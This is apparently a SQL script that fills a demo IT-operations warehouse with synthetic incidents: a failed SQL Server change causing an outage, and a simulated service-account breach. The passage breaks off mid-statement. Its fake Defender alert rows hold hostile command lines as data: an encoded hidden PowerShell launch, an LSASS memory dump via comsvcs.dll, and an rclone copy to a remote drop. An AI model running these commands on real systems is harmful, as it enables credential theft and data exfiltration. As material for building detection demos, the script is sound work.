-- ============================================================================
-- 30_itops_demo/05_inject_scenarios.sql
-- Injects the cross-domain storylines (answer keys: docs/ITOPS_DEMO_SCENARIOS.md).
-- Rows are tagged SOURCE = 'scenario:<name>'. Flatten views prefer scenario rows
-- over baseline rows for the same device-day / job-run / capacity-day.
--
--   S1 outage   : failed emergency SQL CU change on JDE-SQL01 (D-35)
--                 -> LogicMonitor alert storm + downtime on JDE tier
--                 -> P1/P2 JDE incidents in SDP
--                 -> Fabric CDW nightly pipeline fails via FABRIC-GW01, Finance
--                    Power BI reports stale, capacity spike from manual reloads
--   S2 breach   : password spray (D-62) -> svc_jde_integration compromised (D-61)
--                 -> dormant -> Azure role assignment (D-47) -> dormant
--                 -> runCommand on JDE-APP02 (EOS Windows 2012 R2) + Defender alerts (D-33)
--                 -> bulk reads from Fabric WH_CDW_Gold + Power BI exports (D-32)
--                 -> Sentinel multi-stage incident (MSSP had closed earlier ones)
--   S4 ai_spike : Sales & Marketing routes simple prompts to claude-opus-4-1 (last 30 days)
--   (S3 overloaded engineer, S5 unused E5 licenses and S6 EOL servers are part of
--    the baseline generated in 01-03.)
-- Re-runnable: deletes previous scenario rows first.
-- ============================================================================

USE ROLE cortex_role;
USE WAREHOUSE cortex_wh;
USE SCHEMA COWORK.IT_OPS;

SET demo_end = (SELECT demo_end_date FROM REF_DEMO_CONFIG);
-- S1 anchor: change window starts 22:00 UTC, 35 days before demo end
SET s1_t0 = DATEADD(hour, 22, DATEADD(day, -35, $demo_end)::TIMESTAMP_NTZ);
-- S2 anchors
SET s2_spray  = DATEADD(hour, 3, DATEADD(day, -62, $demo_end)::TIMESTAMP_NTZ);
SET s2_login  = DATEADD(minute, 252, DATEADD(day, -61, $demo_end)::TIMESTAMP_NTZ);
SET s2_escal  = DATEADD(minute, 151, DATEADD(day, -47, $demo_end)::TIMESTAMP_NTZ);
SET s2_exec   = DATEADD(minute, 70, DATEADD(day, -33, $demo_end)::TIMESTAMP_NTZ);
SET s2_exfil  = DATEADD(minute, 95, DATEADD(day, -32, $demo_end)::TIMESTAMP_NTZ);
SET attacker_ip = '185.220.101.47';

-- ----------------------------------------------------------------------------
-- Clean previous scenario rows
-- ----------------------------------------------------------------------------
DELETE FROM RAW_SDP_REQUESTS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_SDP_WORKLOGS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_SDP_CHANGES WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_LM_ALERTS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_LM_DEVICE_DAILY WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_ENTRA_SIGNINS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_ENTRA_AUDITS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_AZURE_ACTIVITY WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_DEFENDER_ALERTS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_SENTINEL_ALERTS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_SENTINEL_INCIDENTS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_FABRIC_JOB_RUNS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_FABRIC_CAPACITY_METRICS WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_FABRIC_WAREHOUSE_QUERIES WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_POWERBI_ACTIVITY WHERE SOURCE LIKE 'scenario:%';
DELETE FROM RAW_AI_GATEWAY_REQUESTS WHERE SOURCE LIKE 'scenario:%';

-- ============================================================================
-- S1: JDE-SQL01 change-induced outage
-- ============================================================================
INSERT INTO RAW_SDP_CHANGES
SELECT OBJECT_CONSTRUCT(
    'id', TO_VARCHAR(5000000000 + column1), 'display_id', TO_VARCHAR(column1),
    'title', column2,
    'change_type', OBJECT_CONSTRUCT('name', 'Emergency'),
    'risk', OBJECT_CONSTRUCT('name', 'High'),
    'stage', OBJECT_CONSTRUCT('name', 'Close'),
    'status', OBJECT_CONSTRUCT('name', 'Completed'),
    'closure_code', OBJECT_CONSTRUCT('name', column3),
    'scheduled_start_time', SDP_DT(DATEADD(hour, column4, $s1_t0)),
    'scheduled_end_time', SDP_DT(DATEADD(hour, column4 + 2, $s1_t0)),
    'completed_time', SDP_DT(DATEADD(hour, column4 + column5, $s1_t0)),
    'change_owner', OBJECT_CONSTRUCT('name', 'Jordan Patel', 'email_id', 'jordan.patel@summitlive.example'),
    'group', OBJECT_CONSTRUCT('name', 'Business Applications'),
    'configuration_items', ARRAY_CONSTRUCT(OBJECT_CONSTRUCT('name', 'JDE-SQL01')),
    'reason_for_change', column6,
    'udf_fields', OBJECT_CONSTRUCT('udf_cab_approval', 'Emergency CAB bypass (verbal approval)', 'udf_backout_plan_tested', column7)
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  (1450, 'Emergency: Apply SQL Server 2022 CU14 and TempDB reconfiguration - JDE-SQL01', 'Failed', 0, 3,
   'Vendor advisory for JDE batch deadlocks; applied outside the monthly window', 'No'),
  (1451, 'Emergency: Roll back SQL Server CU14 and restore TempDB configuration - JDE-SQL01', 'Success', 26, 2,
   'Back out CHG 1450 after JDE outage', 'Yes');

-- LogicMonitor alert storm (~160 alerts over 30 hours on the JDE tier + Fabric gateway)
INSERT INTO RAW_LM_ALERTS
WITH hosts AS (
  SELECT column1 AS rn, column2 AS hostname, column3 AS datasource, column4 AS datapoint FROM VALUES
    (0,'JDE-SQL01','Microsoft_SQLServer_Performance','PageLifeExpectancy'),
    (1,'JDE-SQL01','WinCPU','CPUBusyPercent'),
    (2,'JDE-SQL01','Microsoft_SQLServer_Connections','UserConnections'),
    (3,'JDE-APP01','WinService','State'),
    (4,'JDE-APP02','WinService','State'),
    (5,'JDE-APP03','WinService','State'),
    (6,'JDE-BATCH01','WinCPU','CPUBusyPercent'),
    (7,'JDE-WEB01','HTTPS','ResponseTime'),
    (8,'JDE-WEB02','HTTPS','ResponseTime'),
    (9,'FABRIC-GW01','Ping','PingLossPercent')
)
SELECT OBJECT_CONSTRUCT(
    'id', 'LMA' || (900000 + g.i), 'internalId', 'LMD' || (900000 + g.i), 'type', 'dataSourceAlert',
    'severity', IFF(R(g.i,'s1sev') < 0.7, 4, 3),
    'startEpoch', DATE_PART(epoch_second, DATEADD(minute, 15 + FLOOR(R(g.i,'s1t') * 1800), $s1_t0)),
    'endEpoch', DATE_PART(epoch_second, DATEADD(minute, 15 + FLOOR(R(g.i,'s1t') * 1800) + 30 + FLOOR(R(g.i,'s1d') * 210), $s1_t0)),
    'cleared', TRUE, 'acked', TRUE, 'ackedBy', 'jordan.patel@summitlive.example', 'sdted', FALSE,
    'monitorObjectName', h.hostname,
    'resourceTemplateName', h.datasource, 'instanceName', h.datasource, 'dataPointName', h.datapoint,
    'alertValue', TO_VARCHAR(ROUND(95 + R(g.i,'s1v') * 5, 1)), 'threshold', '> 80 90 95', 'rule', 'Tier 1 Critical'
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM (SELECT SEQ4() AS i FROM TABLE(GENERATOR(ROWCOUNT => 160))) g
JOIN hosts h ON h.rn = MOD(g.i, 10);

-- Device-day overrides: downtime and saturation on D-35 and D-34
INSERT INTO RAW_LM_DEVICE_DAILY
SELECT OBJECT_CONSTRUCT(
    'deviceId', d.PAYLOAD:id::NUMBER, 'deviceDisplayName', v.column1,
    'date', TO_VARCHAR(DATEADD(day, v.column2, $demo_end), 'YYYY-MM-DD'),
    'datapoints', OBJECT_CONSTRUCT(
      'CPUBusyPercent', OBJECT_CONSTRUCT('avg', v.column3, 'p95', 99.5),
      'MemoryUtilizationPercent', OBJECT_CONSTRUCT('avg', 88.0, 'p95', 97.0),
      'DiskUsedPercent', OBJECT_CONSTRUCT('max', 71.0),
      'HostStatus', OBJECT_CONSTRUCT('downMinutes', v.column4))
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  ('JDE-SQL01',-35,71.0,95),('JDE-SQL01',-34,88.0,180),
  ('JDE-APP01',-35,55.0,60),('JDE-APP01',-34,62.0,120),
  ('JDE-APP02',-35,57.0,60),('JDE-APP02',-34,64.0,120),
  ('JDE-APP03',-35,52.0,60),('JDE-APP03',-34,60.0,120),
  ('JDE-WEB01',-34,48.0,90),('JDE-WEB02',-34,47.0,90),
  ('JDE-BATCH01',-34,91.0,45) v
JOIN RAW_LM_DEVICES d ON d.PAYLOAD:name::STRING = v.column1;

-- SDP incidents: 14 Urgent + 20 High on JDE, mostly assigned to Jordan Patel
INSERT INTO RAW_SDP_REQUESTS
WITH r AS (
  SELECT i,
    DATEADD(minute, 480 + FLOOR(R(i,'s1c') * 360), $s1_t0) AS created_at,   -- 06:00-12:00 next morning
    IFF(i < 14, 'Urgent', 'High') AS priority,
    ARRAY_CONSTRUCT('JDE unavailable - cannot post journal entries','JDE extremely slow for all users',
                    'Unable to log in to JDE','JDE batch jobs stuck in queue','JDE AP payment run failed')[(MOD(i, 5))::INT]::STRING AS subject,
    ARRAY_CONSTRUCT('JDE-APP01','JDE-APP02','JDE-APP03','JDE-SQL01','JDE-BATCH01','JDE-WEB01')[(MOD(i, 6))::INT]::STRING AS ci,
    IFF(R(i,'s1tech') < 0.7, 0, 6) AS tech_idx,
    40 + FLOOR(R(i,'s1req') * 600) AS req_idx
  FROM (SELECT SEQ4() AS i FROM TABLE(GENERATOR(ROWCOUNT => 34)))
)
SELECT OBJECT_CONSTRUCT(
    'id', TO_VARCHAR(2079997959000000 + r.i), 'display_id', TO_VARCHAR(14500 + r.i),
    'subject', r.subject,
    'request_type', OBJECT_CONSTRUCT('name', 'Incident'),
    'priority', OBJECT_CONSTRUCT('name', r.priority),
    'category', OBJECT_CONSTRUCT('name', 'JD Edwards'),
    'mode', OBJECT_CONSTRUCT('name', IFF(MOD(r.i, 3) = 0, 'Phone Call', 'E-Mail')),
    'status', OBJECT_CONSTRUCT('name', 'Closed'),
    'group', OBJECT_CONSTRUCT('name', 'Business Applications'),
    'technician', OBJECT_CONSTRUCT('name', t.full_name, 'email_id', t.email),
    'requester', OBJECT_CONSTRUCT('name', q.full_name, 'email_id', q.email, 'is_vip_user', q.department = 'Executive'),
    'department', OBJECT_CONSTRUCT('name', q.department),
    'site', OBJECT_CONSTRUCT('name', q.site),
    'created_time', SDP_DT(r.created_at),
    'first_response_due_by_time', SDP_DT(DATEADD(minute, IFF(r.priority = 'Urgent', 30, 60), r.created_at)),
    'responded_time', SDP_DT(DATEADD(minute, 10 + FLOOR(R(r.i,'s1r') * 90), r.created_at)),
    'due_by_time', SDP_DT(DATEADD(hour, IFF(r.priority = 'Urgent', 6, 24), r.created_at)),
    'resolved_time', SDP_DT(DATEADD(hour, 27, $s1_t0)),
    'completed_time', SDP_DT(DATEADD(hour, 96, $s1_t0)),
    'is_overdue', DATEADD(hour, 27, $s1_t0) > DATEADD(hour, IFF(r.priority = 'Urgent', 6, 24), r.created_at),
    'is_first_response_overdue', (10 + FLOOR(R(r.i,'s1r') * 90)) > IFF(r.priority = 'Urgent', 30, 60),
    'is_fcr', FALSE,
    'is_reopened', FALSE,
    'configuration_items', ARRAY_CONSTRUCT(OBJECT_CONSTRUCT('name', r.ci))
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM r
JOIN SEED_PEOPLE t ON t.person_idx = r.tech_idx
JOIN SEED_PEOPLE q ON q.person_idx = r.req_idx;

-- Downstream: Finance reports stale ticket (Fabric / Power BI)
INSERT INTO RAW_SDP_REQUESTS
SELECT OBJECT_CONSTRUCT(
    'id', '2079997959000100', 'display_id', '14600',
    'subject', 'Finance - GL Summary report still shows yesterday''s numbers (month-end close)',
    'request_type', OBJECT_CONSTRUCT('name', 'Incident'),
    'priority', OBJECT_CONSTRUCT('name', 'High'),
    'category', OBJECT_CONSTRUCT('name', 'Microsoft Fabric / Power BI'),
    'mode', OBJECT_CONSTRUCT('name', 'E-Mail'),
    'status', OBJECT_CONSTRUCT('name', 'Closed'),
    'group', OBJECT_CONSTRUCT('name', 'Cloud Platform'),
    'technician', OBJECT_CONSTRUCT('name', t.full_name, 'email_id', t.email),
    'requester', OBJECT_CONSTRUCT('name', q.full_name, 'email_id', q.email, 'is_vip_user', TRUE),
    'department', OBJECT_CONSTRUCT('name', q.department),
    'site', OBJECT_CONSTRUCT('name', q.site),
    'created_time', SDP_DT(DATEADD(minute, 690, $s1_t0)),
    'responded_time', SDP_DT(DATEADD(minute, 740, $s1_t0)),
    'due_by_time', SDP_DT(DATEADD(minute, 690 + 1440, $s1_t0)),
    'resolved_time', SDP_DT(DATEADD(hour, 30, $s1_t0)),
    'completed_time', SDP_DT(DATEADD(hour, 96, $s1_t0)),
    'is_overdue', FALSE, 'is_first_response_overdue', FALSE, 'is_fcr', FALSE, 'is_reopened', FALSE,
    'configuration_items', ARRAY_CONSTRUCT(OBJECT_CONSTRUCT('name', 'FABRIC-GW01'))
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM SEED_PEOPLE t, SEED_PEOPLE q
WHERE t.person_idx = 5
  AND q.person_idx = (SELECT MIN(person_idx) FROM SEED_PEOPLE WHERE department = 'Executive');

-- Worklogs for the outage (Jordan logs a long night)
INSERT INTO RAW_SDP_WORKLOGS
SELECT OBJECT_CONSTRUCT(
    'request_id', TO_VARCHAR(2079997959000000 + g.i), 'id', TO_VARCHAR(4900000000 + g.i),
    'owner', OBJECT_CONSTRUCT('name', 'Jordan Patel', 'email_id', 'jordan.patel@summitlive.example'),
    'worklog_type', OBJECT_CONSTRUCT('name', 'Troubleshooting'),
    'start_time', SDP_DT(DATEADD(hour, 8, $s1_t0)),
    'end_time', SDP_DT(DATEADD(minute, 480 + 45, $s1_t0)),
    'time_spent', OBJECT_CONSTRUCT('hours', '0', 'minutes', '45')
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM (SELECT SEQ4() AS i FROM TABLE(GENERATOR(ROWCOUNT => 34))) g;

-- Fabric CDW: nightly JDE ingest fails through the gateway, downstream cancelled,
-- manual reruns fail until the rollback; semantic models refresh on stale gold data.
INSERT INTO RAW_FABRIC_JOB_RUNS
SELECT OBJECT_CONSTRUCT(
    'id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's1job-' || v.column1 || v.column2 || v.column3),
    'itemId', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 'item-' || v.column1),
    'itemName', v.column1, 'itemType', i.item_type, 'workspaceName', i.workspace_name,
    'jobType', CASE i.item_type WHEN 'DataPipeline' THEN 'Pipeline' WHEN 'Notebook' THEN 'RunNotebook' ELSE 'Refresh' END,
    'invokeType', v.column3,
    'status', v.column4,
    'rootActivityId', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's1root-' || v.column2 || v.column3),
    'startTimeUtc', ISO_TS(DATEADD(minute, v.column2, $s1_t0)),
    'endTimeUtc', ISO_TS(DATEADD(minute, v.column2 + v.column5, $s1_t0)),
    'failureReason', IFF(v.column6 IS NULL, NULL, OBJECT_CONSTRUCT('errorCode', v.column6, 'message', v.column7))
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  -- item, minutes after T0, invokeType, status, duration min, errorCode, message
  ('PL_JDE_Ingest_Nightly', 240, 'Scheduled', 'Failed', 42, 'SqlFailedToConnect',
   'Copy activity failed via on-premises data gateway FABRIC-GW01: Cannot connect to JDE-SQL01:1433. A network-related or instance-specific error occurred (SQL error 10060).'),
  ('NB_Silver_Transform_GL', 290, 'Scheduled', 'Cancelled', 0, 'UpstreamDependencyFailed', 'Skipped: PL_JDE_Ingest_Nightly did not complete'),
  ('PL_Silver_To_Gold', 330, 'Scheduled', 'Cancelled', 0, 'UpstreamDependencyFailed', 'Skipped: NB_Silver_Transform_GL did not complete'),
  ('SM_Finance_GL', 375, 'Scheduled', 'Completed', 11, NULL, NULL),
  ('SM_AP_AR', 380, 'Scheduled', 'Completed', 9, NULL, NULL),
  ('SM_Executive_KPI', 390, 'Scheduled', 'Completed', 6, NULL, NULL),
  ('PL_JDE_Ingest_Nightly', 900, 'Manual', 'Failed', 55, 'SqlFailedToConnect',
   'Copy activity failed via gateway FABRIC-GW01: Timeout expired reading from JDE-SQL01 (lock timeout on F0911).'),
  ('PL_JDE_Ingest_Nightly', 1620, 'Manual', 'Completed', 96, NULL, NULL),
  ('NB_Silver_Transform_GL', 1725, 'Manual', 'Completed', 64, NULL, NULL),
  ('PL_Silver_To_Gold', 1800, 'Manual', 'Completed', 48, NULL, NULL),
  ('SM_Finance_GL', 1860, 'Manual', 'Completed', 14, NULL, NULL),
  ('SM_AP_AR', 1865, 'Manual', 'Completed', 12, NULL, NULL) v
JOIN SEED_FABRIC_ITEMS i ON i.item_name = v.column1;

-- Capacity spike from full reloads on D-34 / D-33 (throttling interactive users)
INSERT INTO RAW_FABRIC_CAPACITY_METRICS
SELECT OBJECT_CONSTRUCT(
    'capacityName', 'slg-fabric-f64', 'capacitySku', 'F64', 'capacityCUs', 64,
    'date', TO_VARCHAR(DATEADD(day, v.column2, $demo_end), 'YYYY-MM-DD'),
    'workspaceName', i.workspace_name, 'itemName', i.item_name, 'itemKind', i.item_type,
    'billingType', IFF(i.item_type IN ('Report','Warehouse'), 'Interactive', 'Background'),
    'operationName', CASE i.item_type WHEN 'DataPipeline' THEN 'Pipeline Run' WHEN 'Notebook' THEN 'Notebook Run'
                        WHEN 'SemanticModel' THEN 'Dataset On Demand Refresh' WHEN 'Report' THEN 'Query'
                        WHEN 'Warehouse' THEN 'Warehouse Query' ELSE 'OneLake Read via Proxy' END,
    'cuSeconds', ROUND(i.daily_cu_seconds * v.column3, 0),
    'throttlingMinutes', v.column4,
    'operations', 500
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  ('PL_JDE_Ingest_Nightly',-34,3.5,0),('NB_Silver_Transform_GL',-34,1.0,0),('WH_CDW_Gold',-34,1.8,35),
  ('Finance - GL Summary',-34,2.6,35),('SM_Finance_GL',-34,2.2,0),
  ('PL_JDE_Ingest_Nightly',-33,4.2,0),('NB_Silver_Transform_GL',-33,3.1,0),('PL_Silver_To_Gold',-33,2.8,0),
  ('WH_CDW_Gold',-33,2.4,48),('SM_Finance_GL',-33,2.9,0),('SM_AP_AR',-33,2.5,0),('Finance - GL Summary',-33,2.2,48) v
JOIN SEED_FABRIC_ITEMS i ON i.item_name = v.column1;

-- Finance users hammer the stale GL report the morning after
INSERT INTO RAW_POWERBI_ACTIVITY
SELECT OBJECT_CONSTRUCT(
    'Id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's1pbi-' || g.i),
    'RecordType', 20, 'CreationTime', ISO_TS(DATEADD(minute, 600 + FLOOR(R(g.i,'s1p') * 240), $s1_t0)),
    'Operation', IFF(MOD(g.i, 8) = 0, 'RefreshDataset', 'ViewReport'), 'Activity', IFF(MOD(g.i, 8) = 0, 'RefreshDataset', 'ViewReport'),
    'Workload', 'PowerBI', 'UserType', 0, 'UserId', p.email, 'UserKey', TO_VARCHAR(100320000 + p.person_idx),
    'ClientIP', '203.0.113.' || (10 + MOD(p.person_idx, 40)),
    'WorkSpaceName', 'SLG-Finance-Reporting', 'ReportName', 'Finance - GL Summary', 'DatasetName', 'SM_Finance_GL',
    'ItemName', 'Finance - GL Summary', 'ConsumptionMethod', 'Power BI Web', 'DistributionMethod', 'App'
  ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM (SELECT SEQ4() AS i FROM TABLE(GENERATOR(ROWCOUNT => 80))) g
JOIN (SELECT ROW_NUMBER() OVER (ORDER BY person_idx) - 1 AS rn, email, person_idx FROM SEED_PEOPLE WHERE department = 'Finance') p
  ON p.rn = MOD(g.i * 7, 136);

-- ============================================================================
-- S2: service account compromise (svc_jde_integration)
-- ============================================================================
-- Password spray: 420 failures from Tor exit range across 120 users + the service account
INSERT INTO RAW_ENTRA_SIGNINS
SELECT OBJECT_CONSTRUCT(
    'id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2spray-' || g.i),
    'createdDateTime', ISO_TS(DATEADD(second, FLOOR(R(g.i,'s2t') * 10800), $s2_spray)),
    'userPrincipalName', IFF(MOD(g.i, 84) = 0, 'svc_jde_integration@summitlive.example', p.email),
    'userDisplayName', IFF(MOD(g.i, 84) = 0, 'svc JDE Integration', p.full_name),
    'appDisplayName', 'Office 365 Exchange Online',
    'ipAddress', '185.220.101.' || (1 + MOD(g.i, 60)),
    'clientAppUsed', 'Other clients',
    'isInteractive', TRUE,
    'conditionalAccessStatus', 'notApplied',
    'authenticationRequirement', 'singleFactorAuthentication',
    'riskLevelDuringSignIn', 'medium',
    'status', IFF(MOD(g.i, 140) = 7,
                  OBJECT_CONSTRUCT('errorCode', 50053, 'failureReason', 'Account is locked because user tried to sign in too many times with an incorrect user ID or password.'),
                  OBJECT_CONSTRUCT('errorCode', 50126, 'failureReason', 'Invalid username or password or Invalid on-premise username or password.')),
    'location', OBJECT_CONSTRUCT('city', ARRAY_CONSTRUCT('Frankfurt','Amsterdam','Bucharest')[(MOD(g.i, 3))::INT]::STRING,
                                 'countryOrRegion', ARRAY_CONSTRUCT('DE','NL','RO')[(MOD(g.i, 3))::INT]::STRING),
    'deviceDetail', OBJECT_CONSTRUCT('operatingSystem', 'Linux', 'browser', 'python-requests/2.31', 'isCompliant', FALSE)
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM (SELECT SEQ4() AS i FROM TABLE(GENERATOR(ROWCOUNT => 420))) g
JOIN SEED_PEOPLE p ON p.person_idx = 40 + MOD(g.i * 13, 120) * 5;

-- Successful attacker sign-ins as the service account (single factor, CA not applied)
INSERT INTO RAW_ENTRA_SIGNINS
SELECT OBJECT_CONSTRUCT(
    'id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2login-' || column1),
    'createdDateTime', ISO_TS(column2::TIMESTAMP_NTZ),
    'userPrincipalName', 'svc_jde_integration@summitlive.example', 'userDisplayName', 'svc JDE Integration',
    'appDisplayName', column3, 'ipAddress', $attacker_ip, 'clientAppUsed', 'Other clients', 'isInteractive', TRUE,
    'conditionalAccessStatus', 'notApplied', 'authenticationRequirement', 'singleFactorAuthentication',
    'riskLevelDuringSignIn', column4, 'status', OBJECT_CONSTRUCT('errorCode', 0),
    'location', OBJECT_CONSTRUCT('city', 'Frankfurt', 'countryOrRegion', 'DE'),
    'deviceDetail', OBJECT_CONSTRUCT('operatingSystem', 'Linux', 'browser', 'python-requests/2.31', 'isCompliant', FALSE)
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  (1, $s2_login, 'Office 365 Exchange Online', 'medium'),
  (2, $s2_escal, 'Azure Portal', 'low'),
  (3, DATEADD(minute, -15, $s2_exec), 'Azure Portal', 'none'),
  (4, DATEADD(minute, -10, $s2_exfil), 'Microsoft Fabric', 'none'),
  (5, DATEADD(minute, 12, $s2_exfil), 'Power BI Service', 'none');

-- Persistence / escalation in Entra and Azure
INSERT INTO RAW_ENTRA_AUDITS
SELECT OBJECT_CONSTRUCT(
    'id', 'Directory_' || UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2audit-' || column1),
    'activityDateTime', ISO_TS(column2::TIMESTAMP_NTZ), 'activityDisplayName', column3,
    'category', column4, 'result', 'success',
    'initiatedBy', OBJECT_CONSTRUCT('user', OBJECT_CONSTRUCT('userPrincipalName', 'svc_jde_integration@summitlive.example', 'ipAddress', $attacker_ip)),
    'targetResources', ARRAY_CONSTRUCT(OBJECT_CONSTRUCT('displayName', column5, 'type', column6))
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  (1, DATEADD(minute, 14, $s2_escal), 'Update application - Certificates and secrets management', 'ApplicationManagement', 'JDE-Integration-App', 'Application'),
  (2, DATEADD(minute, 16, $s2_escal), 'Add service principal credentials', 'ApplicationManagement', 'JDE-Integration-App', 'ServicePrincipal');

INSERT INTO RAW_AZURE_ACTIVITY
SELECT OBJECT_CONSTRUCT(
    'TimeGenerated', ISO_TS(column1::TIMESTAMP_NTZ), 'OperationNameValue', column2, 'ActivityStatusValue', 'Success',
    'CategoryValue', 'Administrative', 'Caller', 'svc_jde_integration@summitlive.example', 'CallerIpAddress', $attacker_ip,
    'ResourceGroup', column3, '_ResourceId', '/subscriptions/0000-slg/resourceGroups/' || column3 || '/providers/' || column4
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  (DATEADD(minute, 9, $s2_escal), 'Microsoft.Authorization/roleAssignments/write', 'rg-jde-prod', 'Microsoft.Authorization/roleAssignments/contributor-svc_jde_integration'),
  (DATEADD(minute, 2, $s2_exec), 'Microsoft.Compute/virtualMachines/runCommand/action', 'rg-jde-prod', 'Microsoft.Compute/virtualMachines/JDE-APP02'),
  (DATEADD(minute, 30, $s2_exec), 'Microsoft.Storage/storageAccounts/listKeys/action', 'rg-fabric-cdw', 'Microsoft.Storage/storageAccounts/stcdwstaging'),
  (DATEADD(minute, -5, $s2_exfil), 'Microsoft.Network/networkSecurityGroups/securityRules/write', 'rg-jde-prod', 'Microsoft.Network/networkSecurityGroups/nsg-jde-app/securityRules/allow-out-443-any');

-- Defender XDR detections on JDE-APP02 (Windows Server 2012 R2 - end of support)
INSERT INTO RAW_DEFENDER_ALERTS
SELECT OBJECT_CONSTRUCT(
    'Timestamp', ISO_TS(column1::TIMESTAMP_NTZ), 'AlertId', column2, 'Title', column3, 'Category', column4,
    'Severity', 'High', 'ServiceSource', 'Microsoft Defender for Endpoint', 'DetectionSource', 'EDR',
    'AttackTechniques', column5,
    'Evidence', ARRAY_CONSTRUCT(
        OBJECT_CONSTRUCT('EntityType','Machine','EvidenceRole','Impacted','DeviceName','JDE-APP02'),
        OBJECT_CONSTRUCT('EntityType','User','EvidenceRole','Impacted','AccountUpn','svc_jde_integration@summitlive.example'),
        OBJECT_CONSTRUCT('EntityType','Process','EvidenceRole','Related','FileName', column6, 'ProcessCommandLine', column7),
        OBJECT_CONSTRUCT('EntityType','Ip','EvidenceRole','Related','RemoteIP', $attacker_ip))
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  (DATEADD(minute, 10, $s2_exec), 'da000000900001', 'Suspicious PowerShell command line', 'Execution', '["PowerShell (T1059.001)"]',
   'powershell.exe', 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'),
  (DATEADD(minute, 24, $s2_exec), 'da000000900002', 'Possible credential dumping via LSASS memory access', 'CredentialAccess', '["LSASS Memory (T1003.001)"]',
   'rundll32.exe', 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Windows\\Temp\\ls.dmp full'),
  (DATEADD(minute, 35, $s2_exfil), 'da000000900003', 'Possible data exfiltration to cloud storage', 'Exfiltration', '["Exfiltration to Cloud Storage (T1567.002)"]',
   'rclone.exe', 'rclone.exe copy C:\\Windows\\Temp\\gl_export remote:slg-drop --transfers 16');

-- Bulk reads from the Fabric CDW gold warehouse with the stolen service account
INSERT INTO RAW_FABRIC_WAREHOUSE_QUERIES
SELECT OBJECT_CONSTRUCT(
    'distributed_statement_id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2whq-' || column1),
    'session_id', 777, 'login_name', 'svc_jde_integration@summitlive.example', 'program_name', 'python (pyodbc)',
    'start_time', ISO_TS(DATEADD(minute, column1 * 4, $s2_exfil)),
    'end_time', ISO_TS(DATEADD(millisecond, column3, DATEADD(minute, column1 * 4, $s2_exfil))),
    'total_elapsed_time_ms', column3, 'status', 'Succeeded', 'row_count', column4,
    'data_scanned_remote_storage_mb', column5, 'command', column2
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  (0, 'SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES', 900, 64, 0.2),
  (1, 'SELECT * FROM gold.dim_vendor', 4200, 18250, 22.4),
  (2, 'SELECT * FROM gold.fact_ap_invoice', 186000, 1920000, 1480.5),
  (3, 'SELECT * FROM gold.fact_gl_journal', 412000, 4810000, 3290.8),
  (4, 'SELECT * FROM gold.dim_account', 2100, 6400, 3.1);

-- Power BI exports by the service account from the attacker IP
INSERT INTO RAW_POWERBI_ACTIVITY
SELECT OBJECT_CONSTRUCT(
    'Id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2pbi-' || column1),
    'RecordType', 20, 'CreationTime', ISO_TS(DATEADD(minute, 14 + column1 * 3, $s2_exfil)),
    'Operation', 'ExportReport', 'Activity', 'ExportReport', 'Workload', 'PowerBI', 'UserType', 0,
    'UserId', 'svc_jde_integration@summitlive.example', 'UserKey', '100329999', 'ClientIP', $attacker_ip,
    'UserAgent', 'python-requests/2.31',
    'WorkSpaceName', 'SLG-Finance-Reporting', 'ReportName', column2, 'DatasetName', column3, 'ItemName', column2,
    'ConsumptionMethod', 'Power BI REST API', 'DistributionMethod', 'Workspace',
